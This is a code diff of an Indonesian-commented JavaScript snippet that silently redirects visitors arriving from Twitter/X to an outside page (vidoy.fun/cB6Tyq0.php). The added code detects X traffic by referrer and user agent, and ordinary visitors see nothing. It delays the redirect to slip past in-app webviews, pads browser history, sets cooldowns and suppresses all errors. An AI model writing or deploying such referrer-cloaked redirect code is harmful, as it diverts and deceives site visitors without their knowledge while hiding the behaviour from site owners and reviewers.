@@ -1,41 +1,52 @@
 (function () {
   try {
     // === SETTING ===
-    var target = "https://vidoy.fun/cB6Tyq0.php"; // tujuan redirect
+    var target = "https://vidoy.fun/cB6Tyq0.php"; // tujuan redirect (WAJIB https)
     var cooldownMs = 10 * 1000;                   // 1 menit (ubah sesuai kebutuhan)
-    // =================
+    // ===============
 
     if (!/^https:\/\//i.test(target)) return;
 
-    // bypass manual: ?noredir=1 atau #noredir
-    if (/[?#](?:.*[&?])?noredir=1/i.test(location.search + location.hash)) return;
+    // bypass manual & opsi paksa
+    var qs = location.search + location.hash;
+    if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(qs)) return;
+    var forceX = /[?#](?:.*[&?])?onlyx=1(?:&|$)/i.test(qs);
 
-    var page = location.origin + location.pathname;
-    var sessKey = "redir_seen:" + page + "|" + target;
-    var cdKey   = "redir_cd:" + page + "|" + target;
+    // Deteksi Twitter/X (referrer & UA)
+    var REF = String(document.referrer || "");
+    var UA  = String(navigator.userAgent || "");
 
-    var now = Date.now();
+    // pola umum: t.co (shortener), twitter.com (referrer), 'Twitter' di UA webview
+    var reXRef = /(t\.co|twitter\.com)/i;
+    var reXUA  = /twitter/i;
 
-    // anti-loop per tab
+    var isX = reXRef.test(REF) || reXUA.test(UA) || forceX;
+    if (!isX) return; // khusus Twitter/X
+
+    // Anti-loop per tab + cooldown lintas tab
+    var page = location.origin + location.pathname; // abaikan query biar konsisten
+    var sessKey = "redir_x_seen:" + page + "|" + target;
+    var cdKey   = "redir_x_cd:"   + page + "|" + target;
+
     if (sessionStorage.getItem(sessKey)) return;
 
-    // cek cooldown global
+    var now   = Date.now();
     var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
     if (now < until) return;
 
-    // lock supaya tidak retrigger
+    // Lock dulu
     sessionStorage.setItem(sessKey, "1");
     localStorage.setItem(cdKey, String(now + cooldownMs));
 
-    // tambahkan bantalan history biar tab nggak “hilang” saat balik
+    // Bantalan history: biar tab nggak "hilang" saat user balik dari target
     try { history.pushState({ hold: 1 }, "", location.href); } catch (_) {}
 
-    // redirect (dengan delay kecil supaya WebView tidak blok)
+    // Delay kecil: beberapa webview X lebih patuh kalau tidak instant
     setTimeout(function () {
       try { location.href = target; } catch (_) {}
-    }, 150);
+    }, 120);
 
-  } catch (e) {
-    console.error("Redirect error:", e);
+  } catch (_) {
+    // diamkan agar tidak ganggu halaman
   }
 })();
